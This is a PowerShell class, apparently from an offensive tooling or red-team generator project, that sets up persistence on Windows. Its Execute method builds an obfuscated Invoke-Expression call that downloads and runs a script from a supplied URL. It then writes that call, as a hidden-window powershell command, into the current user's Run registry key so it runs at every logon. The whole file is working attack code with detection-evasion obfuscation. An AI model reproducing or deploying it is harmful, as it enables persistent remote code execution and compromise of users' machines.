Class ObfPersistenceExecuteScriptWeb11 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent11.ps1
        $DoAll = ".`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Member|Where-Object{(GV _).Value.Name-like'*ts'}).Name).Invoke('I*-E*n')(New-Object Net.WebClient).DownloadString('$url')"
        #$DoAll = ""
        
        #Make a payload from PayloadURL
        #Invoke expression is already included in $DoAll command
        $Payload = "powershell -win hid -noP -c `"$DoAll`""

        $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

        # Check if it already exists a key with the given name
        if($runKeys.$rKeyName){
            # Remove it if already exists
            Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $rKeyName
        }
        New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $rKeyName -Value $Payload

    }

}